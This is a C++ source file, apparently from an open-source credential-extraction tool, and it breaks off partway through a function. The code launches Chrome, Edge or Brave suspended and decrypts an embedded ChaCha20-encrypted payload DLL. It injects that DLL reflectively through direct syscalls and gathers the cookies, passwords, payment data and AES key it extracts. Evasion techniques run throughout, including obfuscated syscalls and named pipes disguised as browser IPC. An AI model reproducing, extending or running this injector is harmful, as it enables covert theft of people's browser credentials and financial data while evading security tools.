// chrome_inject.cpp
// v0.16.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <filesystem>
#include <optional>
#include <map>
#include <memory>
#include <stdexcept>
#include <cstdint>
#include <algorithm>

#include "syscalls.h"
#include "syscalls_obfuscation.h"
#define CHACHA20_IMPLEMENTATION
#include "..\libs\chacha\chacha20.h"

#pragma comment(lib, "Rpcrt4.lib")

#ifndef IMAGE_FILE_MACHINE_AMD64
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#endif
#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace
{
    constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
    constexpr const char *APP_VERSION = "v0.16.1";

    const uint8_t g_decryptionKey[32] = {
        0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
        0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
        0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
        0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94};

    const uint8_t g_decryptionNonce[12] = {
        0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
        0x88, 0xE5, 0x3C, 0x50};

    namespace fs = std::filesystem;

    struct HandleDeleter
    {
        void operator()(HANDLE h) const
        {
            if (h && h != INVALID_HANDLE_VALUE)
                NtClose_syscall(h);
        }
    };
    using UniqueHandle = std::unique_ptr<void, HandleDeleter>;

    struct ModuleDeleter
    {
        void operator()(HMODULE h) const
        {
            if (h)
                FreeLibrary(h);
        }
    };
    using UniqueModule = std::unique_ptr<std::remove_pointer<HMODULE>::type, ModuleDeleter>;

    namespace Utils
    {
        std::string WStringToUtf8(std::wstring_view w_sv)
        {
            if (w_sv.empty())
                return {};
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
            std::string utf8_str(size_needed, '\0');
            WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
            return utf8_str;
        }

        std::string PtrToHexStr(const void *ptr)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
            return oss.str();
        }

        std::string NtStatusToString(NTSTATUS status)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            return oss.str();
        }

        std::wstring GenerateBrowserMimicPipeName(const std::wstring &browserType)
        {
            DWORD pid = GetCurrentProcessId();
            DWORD tid = GetCurrentThreadId();
            DWORD tick = GetTickCount();

            DWORD id1 = (pid ^ tick) & 0xFFFF;
            DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
            DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

            std::wstring pipeName = L"\\\\.\\pipe\\";

            std::wstring browserLower = browserType;
            std::transform(browserLower.begin(), browserLower.end(), browserLower.begin(), ::towlower);

            if (browserLower == L"chrome")
            {
                static const wchar_t *chromePatterns[] = {
                    L"chrome.sync.%u.%u.%04X",
                    L"chrome.nacl.%u_%04X",
                    L"mojo.%u.%u.%04X.chrome"};
                int patternIdx = (id1 + id2) % 3;
                wchar_t buffer[128];
                swprintf_s(buffer, chromePatterns[patternIdx], id1, id2, id3);
                pipeName += buffer;
            }
            else if (browserLower == L"edge")
            {
                static const wchar_t *edgePatterns[] = {
                    L"msedge.sync.%u.%u",
                    L"msedge.crashpad_%u_%04X",
                    L"LOCAL\\msedge_%u"};
                int patternIdx = (id2 + id3) % 3;
                wchar_t buffer[128];
                swprintf_s(buffer, edgePatterns[patternIdx], id1, id2);
                pipeName += buffer;
            }
            else if (browserLower == L"brave")
            {
                static const wchar_t *bravePatterns[] = {
                    L"brave.sync.%u.%u",
                    L"mojo.%u.%u.brave",
                    L"brave.crashpad_%u"};
                int patternIdx = (id3) % 3;
                wchar_t buffer[128];
                swprintf_s(buffer, bravePatterns[patternIdx], id1, id2);
                pipeName += buffer;
            }
            else
            {
                wchar_t buffer[128];
                swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
                pipeName += buffer;
            }

            return pipeName;
        }

        std::wstring GenerateUniquePipeName()
        {
            UUID uuid;
            UuidCreate(&uuid);
            wchar_t *uuidStrRaw = nullptr;
            UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw);
            std::wstring pipeName = L"\\\\.\\pipe\\" + std::wstring(uuidStrRaw);
            RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
            return pipeName;
        }

        std::string Capitalize(const std::string &str)
        {
            if (str.empty())
                return str;
            std::string result = str;
            result[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(result[0])));
            return result;
        }
    }
}

class Console
{
public:
    explicit Console(bool verbose) : m_verbose(verbose), m_hConsole(GetStdHandle(STD_OUTPUT_HANDLE))
    {
        CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
        GetConsoleScreenBufferInfo(m_hConsole, &consoleInfo);
        m_originalAttributes = consoleInfo.wAttributes;
    }

    void displayBanner() const
    {
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "_________ .__                         ___________.__                       __                \n"
                  << "\\_   ___ \\|  |_________  ____   _____ \\_   _____/|  |   _______  _______ _/  |_  ___________ \n"
                  << "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\ |    __)_ |  | _/ __ \\  \\/ /\\__  \\\\   __\\/  _ \\_  __ \\\n"
                  << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
                  << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
                  << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
                  << " Direct Syscall-Based Reflective Hollowing\n"
                  << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
                  << "\n\n";
        ResetColor();
    }

    void printUsage() const
    {
        SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::wcout << L"Usage:\n"
                   << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
                   << L"Options:\n"
                   << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                   << L"  --verbose|-v             Enable verbose debug output from the injector\n"
                   << L"  --fingerprint|-f         Extract browser fingerprinting data\n"
                   << L"  --help|-h                Show this help message\n\n"
                   << L"Browser targets:\n"
                   << L"  chrome  - Extract from Google Chrome\n"
                   << L"  brave   - Extract from Brave Browser\n"
                   << L"  edge    - Extract from Microsoft Edge\n"
                   << L"  all     - Extract from all installed browsers\n";
        ResetColor();
    }

    void Info(const std::string &msg) const { print("[*]", msg, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Success(const std::string &msg) const { print("[+]", msg, FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Error(const std::string &msg) const { print("[-]", msg, FOREGROUND_RED | FOREGROUND_INTENSITY); }
    void Warn(const std::string &msg) const { print("[!]", msg, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Debug(const std::string &msg) const
    {
        if (m_verbose)
            print("[#]", msg, FOREGROUND_RED | FOREGROUND_GREEN);
    }

    void Relay(const std::string &message) const
    {
        size_t tagStart = message.find('[');
        size_t tagEnd = message.find(']', tagStart);
        if (tagStart != std::string::npos && tagEnd != std::string::npos)
        {
            std::cout << message.substr(0, tagStart);
            std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);

            WORD color = m_originalAttributes;
            if (tag == "[+]")
                color = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[-]")
                color = FOREGROUND_RED | FOREGROUND_INTENSITY;
            else if (tag == "[*]")
                color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[!]")
                color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

            SetColor(color);
            std::cout << tag;
            ResetColor();
            std::cout << message.substr(tagEnd + 1) << std::endl;
        }
        else
        {
            std::cout << message << std::endl;
        }
    }

    bool m_verbose;

private:
    void print(const std::string &tag, const std::string &msg, WORD color) const
    {
        SetColor(color);
        std::cout << tag;
        ResetColor();
        std::cout << " " << msg << std::endl;
    }
    void SetColor(WORD attributes) const { SetConsoleTextAttribute(m_hConsole, attributes); }
    void ResetColor() const { SetConsoleTextAttribute(m_hConsole, m_originalAttributes); }

    HANDLE m_hConsole;
    WORD m_originalAttributes;
};

class BrowserPathResolver
{
public:
    explicit BrowserPathResolver(const Console &console) : m_console(console) {}

    std::wstring resolve(const std::wstring &browserExeName)
    {
        m_console.Debug("Searching Registry for: " + Utils::WStringToUtf8(browserExeName));

        const std::wstring registryPaths[] = {
            L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName,
            L"\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName};

        for (const auto &regPath : registryPaths)
        {
            std::wstring path = queryRegistryDefaultValue(regPath);
            if (!path.empty() && fs::exists(path))
            {
                m_console.Debug("Found at: " + Utils::WStringToUtf8(path));
                return path;
            }
        }

        m_console.Debug("Not found in Registry");
        return L"";
    }

    std::vector<std::pair<std::wstring, std::wstring>> findAllInstalledBrowsers()
    {
        std::vector<std::pair<std::wstring, std::wstring>> installedBrowsers;

        const std::pair<std::wstring, std::wstring> supportedBrowsers[] = {
            {L"chrome", L"chrome.exe"},
            {L"edge", L"msedge.exe"},
            {L"brave", L"brave.exe"}};

        m_console.Debug("Enumerating installed browsers...");

        for (const auto &[browserType, exeName] : supportedBrowsers)
        {
            std::wstring path = resolve(exeName);
            if (!path.empty())
            {
                installedBrowsers.push_back({browserType, path});
                m_console.Debug("Found " + Utils::Capitalize(Utils::WStringToUtf8(browserType)) + " at: " + Utils::WStringToUtf8(path));
            }
        }

        if (installedBrowsers.empty())
            m_console.Warn("No supported browsers found installed on this system");
        else
            m_console.Debug("Found " + std::to_string(installedBrowsers.size()) + " browser(s) to process");

        return installedBrowsers;
    }

private:
    std::wstring queryRegistryDefaultValue(const std::wstring &keyPath)
    {
        std::vector<wchar_t> pathBuffer(keyPath.begin(), keyPath.end());
        pathBuffer.push_back(L'\0');

        UNICODE_STRING_SYSCALLS keyName;
        keyName.Buffer = pathBuffer.data();
        keyName.Length = static_cast<USHORT>(keyPath.length() * sizeof(wchar_t));
        keyName.MaximumLength = static_cast<USHORT>(pathBuffer.size() * sizeof(wchar_t));

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        HANDLE hKey = nullptr;
        NTSTATUS status = NtOpenKey_syscall(&hKey, KEY_READ, &objAttr);

        if (!NT_SUCCESS(status))
        {
            if (status != (NTSTATUS)0xC0000034)
                m_console.Debug("Registry access failed: " + Utils::NtStatusToString(status));
            return L"";
        }

        UniqueHandle keyGuard(hKey);

        UNICODE_STRING_SYSCALLS valueName = {0, 0, nullptr};
        ULONG bufferSize = 4096;
        std::vector<BYTE> buffer(bufferSize);
        ULONG resultLength = 0;

        status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
                                         buffer.data(), bufferSize, &resultLength);

        if (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_BUFFER_OVERFLOW)
        {
            buffer.resize(resultLength);
            bufferSize = resultLength;
            status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
                                             buffer.data(), bufferSize, &resultLength);
        }

        if (!NT_SUCCESS(status))
            return L"";

        auto kvpi = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buffer.data());

        if (kvpi->Type != REG_SZ && kvpi->Type != REG_EXPAND_SZ)
            return L"";
        if (kvpi->DataLength < sizeof(wchar_t) * 2)
            return L"";

        size_t charCount = kvpi->DataLength / sizeof(wchar_t);
        std::wstring path(reinterpret_cast<wchar_t *>(kvpi->Data), charCount);

        while (!path.empty() && path.back() == L'\0')
            path.pop_back();

        if (path.empty())
            return L"";

        if (kvpi->Type == REG_EXPAND_SZ)
        {
            std::vector<wchar_t> expanded(MAX_PATH * 2);
            DWORD size = ExpandEnvironmentStringsW(path.c_str(), expanded.data(), static_cast<DWORD>(expanded.size()));
            if (size > 0 && size <= expanded.size())
                path = std::wstring(expanded.data());
        }

        return path;
    }

    const Console &m_console;
};

struct Configuration
{
    bool verbose = false;
    bool extractFingerprint = false;
    fs::path outputPath;
    std::wstring browserType;
    std::wstring browserProcessName;
    std::wstring browserDefaultExePath;
    std::string browserDisplayName;

    bool Validate(const Console &console) const
    {
        if (browserDefaultExePath.empty())
        {
            console.Error("Browser executable path is empty");
            return false;
        }

        if (!fs::exists(browserDefaultExePath))
        {
            console.Error("Browser executable not found: " + Utils::WStringToUtf8(browserDefaultExePath));
            console.Info("Please ensure " + browserDisplayName + " is properly installed");
            return false;
        }

        if (!fs::is_regular_file(browserDefaultExePath))
        {
            console.Error("Browser path is not a valid executable file");
            return false;
        }

        std::error_code ec;
        fs::create_directories(outputPath, ec);
        if (ec)
        {
            console.Error("Cannot create or access output directory: " + outputPath.u8string());
            console.Error("Error: " + ec.message());
            return false;
        }

        return true;
    }

    static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
    {
        Configuration config;
        fs::path customOutputPath;

        for (int i = 1; i < argc; ++i)
        {
            std::wstring_view arg = argv[i];
            if (arg == L"--verbose" || arg == L"-v")
                config.verbose = true;
            else if (arg == L"--fingerprint" || arg == L"-f")
                config.extractFingerprint = true;
            else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
                customOutputPath = argv[++i];
            else if (arg == L"--help" || arg == L"-h")
            {
                console.printUsage();
                return std::nullopt;
            }
            else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
                config.browserType = arg;
            else
            {
                console.Warn("Unknown or misplaced argument: " + Utils::WStringToUtf8(arg));
                return std::nullopt;
            }
        }

        if (config.browserType.empty())
        {
            console.printUsage();
            return std::nullopt;
        }

        std::transform(config.browserType.begin(), config.browserType.end(), config.browserType.begin(), ::towlower);

        static const std::map<std::wstring, std::wstring> browserExeMap = {
            {L"chrome", L"chrome.exe"},
            {L"brave", L"brave.exe"},
            {L"edge", L"msedge.exe"}};

        auto it = browserExeMap.find(config.browserType);
        if (it == browserExeMap.end())
        {
            console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
            return std::nullopt;
        }

        config.browserProcessName = it->second;

        BrowserPathResolver resolver(console);
        config.browserDefaultExePath = resolver.resolve(config.browserProcessName);

        if (config.browserDefaultExePath.empty())
        {
            console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + " installation in Registry");
            console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + " is properly installed");
            return std::nullopt;
        }

        config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
        config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);

        if (!config.Validate(console))
            return std::nullopt;

        return config;
    }
};

class TargetProcess
{
public:
    TargetProcess(const Configuration &config, const Console &console) : m_config(config), m_console(console) {}

    void createSuspended()
    {
        m_console.Debug("Creating suspended " + m_config.browserDisplayName + " process.");
        m_console.Debug("Target executable path: " + Utils::WStringToUtf8(m_config.browserDefaultExePath));

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        if (!CreateProcessW(m_config.browserDefaultExePath.c_str(), nullptr, nullptr, nullptr,
                            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
            throw std::runtime_error("CreateProcessW failed. Error: " + std::to_string(GetLastError()));

        m_hProcess.reset(pi.hProcess);
        m_hThread.reset(pi.hThread);
        m_pid = pi.dwProcessId;

        m_console.Debug("Created suspended process PID: " + std::to_string(m_pid));
        checkArchitecture();
    }

    void terminate()
    {
        if (m_hProcess)
        {
            m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
            NtTerminateProcess_syscall(m_hProcess.get(), 0);

            WaitForSingleObject(m_hProcess.get(), 2000);

            m_console.Debug(m_config.browserDisplayName + " terminated by injector.");
        }
    }

    HANDLE getProcessHandle() const { return m_hProcess.get(); }

private:
    void checkArchitecture()
    {
        USHORT processArch = 0, nativeMachine = 0;
        auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
        if (!fnIsWow64Process2 || !fnIsWow64Process2(m_hProcess.get(), &processArch, &nativeMachine))
            throw std::runtime_error("Failed to determine target process architecture.");

        m_arch = (processArch == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processArch;

        constexpr USHORT injectorArch =
#if defined(_M_X64)
            IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
            IMAGE_FILE_MACHINE_ARM64;
#else
            IMAGE_FILE_MACHINE_UNKNOWN;
#endif

        if (m_arch != injectorArch)
            throw std::runtime_error("Architecture mismatch. Injector is " + std::string(getArchName(injectorArch)) +
                                     " but target is " + std::string(getArchName(m_arch)));

        m_console.Debug("Architecture match: Injector=" + std::string(getArchName(injectorArch)) +
                        ", Target=" + std::string(getArchName(m_arch)));
    }

    const char *getArchName(USHORT arch) const
    {
        switch (arch)
        {
        case IMAGE_FILE_MACHINE_AMD64:
            return "x64";
        case IMAGE_FILE_MACHINE_ARM64:
            return "ARM64";
        case IMAGE_FILE_MACHINE_I386:
            return "x86";
        default:
            return "Unknown";
        }
    }

    const Configuration &m_config;
    const Console &m_console;
    DWORD m_pid = 0;
    UniqueHandle m_hProcess;
    UniqueHandle m_hThread;
    USHORT m_arch = 0;
};

class PipeCommunicator
{
public:
    struct ExtractionStats
    {
        int totalCookies = 0;
        int totalPasswords = 0;
        int totalPayments = 0;
        int profileCount = 0;
        std::string aesKey;
    };

    PipeCommunicator(const std::wstring &pipeName, const Console &console) : m_pipeName(pipeName), m_console(console) {}

    void create()
    {
        m_pipeHandle.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                            1, 4096, 4096, 0, nullptr));
        if (!m_pipeHandle)
            throw std::runtime_error("CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));

        m_console.Debug("Named pipe server created: " + Utils::WStringToUtf8(m_pipeName));
    }

    void waitForClient()
    {
        m_console.Debug("Waiting for payload to connect to named pipe.");
        if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
            throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));

        m_console.Debug("Payload connected to named pipe.");

        Sleep(200);
    }

    void sendInitialData(bool isVerbose, bool extractFingerprint, const fs::path &outputPath)
    {
        writeMessage(isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        Sleep(10);
        writeMessage(extractFingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
        Sleep(10);
        writeMessage(outputPath.u8string());
        Sleep(10);
    }

    void relayMessages()
    {
        m_console.Debug("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");

        const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        DWORD startTime = GetTickCount();
        std::string accumulatedData;
        char buffer[4096];
        bool completed = false;
        bool displayedNewline = false;

        while (!completed && (GetTickCount() - startTime < DLL_COMPLETION_TIMEOUT_MS))
        {
            DWORD bytesAvailable = 0;
            if (!PeekNamedPipe(m_pipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                m_console.Error("PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
                break;
            }

            if (bytesAvailable == 0)
            {
                Sleep(100);
                continue;
            }

            DWORD bytesRead = 0;
            if (!ReadFile(m_pipeHandle.get(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                continue;
            }

            accumulatedData.append(buffer, bytesRead);

            size_t messageStart = 0;
            size_t nullPos;
            while ((nullPos = accumulatedData.find('\0', messageStart)) != std::string::npos)
            {
                std::string message = accumulatedData.substr(messageStart, nullPos - messageStart);
                messageStart = nullPos + 1;

                if (message == dllCompletionSignal)
                {
                    m_console.Debug("Payload completion signal received.");
                    completed = true;
                    break;
                }

                parseExtractionMessage(message);

                if (!displayedNewline && m_console.m_verbose && !message.empty())
                {
                    std::cout << std::endl;
                    displayedNewline = true;
                }

                if (!message.empty() && m_console.m_verbose)
                    m_console.Relay(message);
            }
            if (completed)
                break;
            accumulatedData.erase(0, messageStart);
        }

        if (m_console.m_verbose && displayedNewline)
            std::cout << std::endl;

        m_console.Debug("Payload signaled completion or pipe interaction ended.");
    }

    const ExtractionStats &getStats() const { return m_stats; }
    const std::wstring &getName() const { return m_pipeName; }

private:
    void writeMessage(const std::string &msg)
    {
        DWORD bytesWritten = 0;
        if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
            bytesWritten != (msg.length() + 1))
            throw std::runtime_error("WriteFile to pipe failed for message: " + msg);

        m_console.Debug("Sent message to pipe: " + msg);
    }

    void parseExtractionMessage(const std::string &message)
    {
        auto extractNumber = [&message](const std::string &prefix, const std::string &suffix) -> int
        {
            size_t start = message.find(prefix);
            if (start == std::string::npos)
                return 0;
            start += prefix.length();
            size_t end = message.find(suffix, start);
            if (end == std::string::npos)
                return 0;
            try
            {
                return std::stoi(message.substr(start, end - start));
            }
            catch (...)
            {
                return 0;
            }
        };

        if (message.find("Found ") != std::string::npos && message.find("profile(s)") != std::string::npos)
            m_stats.profileCount = extractNumber("Found ", " profile(s)");

        if (message.find("Decrypted AES Key: ") != std::string::npos)
            m_stats.aesKey = message.substr(message.find("Decrypted AES Key: ") + 19);

        if (message.find(" cookies extracted to ") != std::string::npos)
            m_stats.totalCookies += extractNumber("[*] ", " cookies");

        if (message.find(" passwords extracted to ") != std::string::npos)
            m_stats.totalPasswords += extractNumber("[*] ", " passwords");

        if (message.find(" payments extracted to ") != std::string::npos)
            m_stats.totalPayments += extractNumber("[*] ", " payments");
    }

    std::wstring m_pipeName;
    const Console &m_console;
    UniqueHandle m_pipeHandle;
    ExtractionStats m_stats;
};

class InjectionManager
{
public:
    InjectionManager(TargetProcess &target, const Console &console) : m_target(target), m_console(console) {}

    void execute(const std::wstring &pipeName)
    {
        m_console.Debug("Loading and decrypting payload DLL.");
        loadAndDecryptPayload();

        m_console.Debug("Parsing payload PE headers for ReflectiveLoader.");
        DWORD rdiOffset = getReflectiveLoaderOffset();
        if (rdiOffset == 0)
            throw std::runtime_error("Could not find ReflectiveLoader export in payload.");
        m_console.Debug("ReflectiveLoader found at file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));

        m_console.Debug("Allocating memory for payload in target process.");
        PVOID remoteDllBase = nullptr;
        SIZE_T payloadDllSize = m_decryptedDllPayload.size();
        SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalAllocationSize = payloadDllSize + pipeNameByteSize;

        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0,
                                                          &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
        m_console.Debug("Combined memory for payload and parameters allocated at: " + Utils::PtrToHexStr(remoteDllBase));

        m_console.Debug("Writing payload DLL to target process.");
        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase,
                                              m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtWriteVirtualMemory for payload DLL failed: " + Utils::NtStatusToString(status));

        m_console.Debug("Writing pipe name parameter into the same allocation.");
        LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
                                              (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));

        m_console.Debug("Changing payload memory protection to executable.");
        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase,
                                                &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));

        startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);
        m_console.Debug("New thread created for payload. Main thread remains suspended.");
    }

private:
    void loadAndDecryptPayload()
    {
        HMODULE hModule = GetModuleHandle(NULL);
        HRSRC hResInfo = FindResourceW(hModule, L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
        if (!hResInfo)
            throw std::runtime_error("FindResource failed. Error: " + std::to_string(GetLastError()));
        HGLOBAL hResData = LoadResource(hModule, hResInfo);
        if (!hResData)
            throw std::runtime_error("LoadResource failed. Error: " + std::to_string(GetLastError()));
        LPVOID pData = LockResource(hResData);
        DWORD dwSize = SizeofResource(hModule, hResInfo);
        if (!pData || dwSize == 0)
            throw std::runtime_error("LockResource or SizeofResource failed.");

        m_decryptedDllPayload.assign((BYTE *)pData, (BYTE *)pData + dwSize);
        chacha20_xor(g_decryptionKey, g_decryptionNonce, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), 0);
    }

    DWORD getReflectiveLoaderOffset()
    {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_decryptedDllPayload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uintptr_t)m_decryptedDllPayload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
            return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0)
            return 0;

        auto RvaToOffset = [&](DWORD rva) -> PVOID
        {
            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section)
            {
                if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize)
                {
                    return (PVOID)((uintptr_t)m_decryptedDllPayload.data() + section->PointerToRawData + (rva - section->VirtualAddress));
                }
            }
            return nullptr;
        };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(exportDirRva);
        if (!exportDir)
            return 0;

        auto names = (PDWORD)RvaToOffset(exportDir->AddressOfNames);
        auto ordinals = (PWORD)RvaToOffset(exportDir->AddressOfNameOrdinals);
        auto funcs = (PDWORD)RvaToOffset(exportDir->AddressOfFunctions);
        if (!names || !ordinals || !funcs)
            return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
        {
            char *funcName = (char *)RvaToOffset(names[i]);
            if (funcName && strcmp(funcName, "ReflectiveLoader") == 0)
            {
                PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
                if (!funcOffsetPtr)
                    return 0;
                return (DWORD)((uintptr_t)funcOffsetPtr - (uintptr_t)m_decryptedDllPayload.data());
            }
        }
        return 0;
    }

    void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
    {
        m_console.Debug("Creating new thread in target to execute ReflectiveLoader.");

        uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteDllBase) + rdiOffset;
        HANDLE hRemoteThread = nullptr;

        NTSTATUS status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, m_target.getProcessHandle(),
                                                   (LPTHREAD_START_ROUTINE)entryPoint, remotePipeNameAddr, 0, 0, 0, 0, nullptr);

        UniqueHandle remoteThreadGuard(hRemoteThread);

        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));

        m_console.Debug("Successfully created new thread for payload.");
    }

    TargetProcess &m_target;
    const Console &m_console;
    std::vector<BYTE> m_decryptedDllPayload;
};

std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats &stats)
{
    std::stringstream summary;
    std::vector<std::string> items;

    if (stats.totalCookies > 0)
        items.push_back(std::to_string(stats.totalCookies) + " cookies");
    if (stats.totalPasswords > 0)
        items.push_back(std::to_string(stats.totalPasswords) + " passwords");
    if (stats.totalPayments > 0)
        items.push_back(std::to_string(stats.totalPayments) + " payments");

    if (!items.empty())
    {
        summary << "Extracted ";
        for (size_t i = 0; i < items.size(); ++i)
        {
